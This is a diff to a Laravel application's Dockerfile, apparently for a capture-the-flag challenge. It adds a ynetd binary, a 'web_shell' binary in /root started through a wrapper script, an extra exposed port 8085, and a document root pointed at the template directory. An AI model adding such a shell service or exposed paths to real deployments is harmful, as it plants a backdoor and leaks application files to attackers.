@@ -9,14 +9,18 @@ COPY --from=build-composer /app .
 RUN npm install
 RUN npm run build
 
-FROM php:8.2-apache-bullseye as production
+FROM shinsenter/laravel:latest as production
 
 ENV APP_ENV=production
 ENV APP_DEBUG=false
 
-RUN docker-php-ext-configure opcache --enable-opcache && \
-    docker-php-ext-install pdo pdo_mysql
+RUN phpenmod opcache
 COPY docker/php/conf.d/opcache.ini /usr/local/etc/php/conf.d/opcache.ini
+
+ENV WEBHOME="/var/www/html"
+# Set index page to use vite
+ENV APACHE_DOCUMENT_ROOT="/var/www/html/resources/views"
+WORKDIR $WEBHOME
 
 COPY --from=build /app /var/www/html
 COPY docker/000-default.conf /etc/apache2/sites-available/000-default.conf
@@ -33,3 +37,11 @@ RUN php artisan config:cache && \
     chmod 777 -R /var/www/html/storage/ && \
     chown -R www-data:www-data /var/www/ && \
     a2enmod rewrite
+
+ENV PATH="/usr/sbin:${PATH}"
+COPY bin/ynetd /usr/sbin/ynetd
+COPY bin/web_shell /root/web_shell
+EXPOSE 80 8085
+
+COPY bin/wrapper.sh /root/wrapper.sh
+CMD [ "/root/wrapper.sh" ]
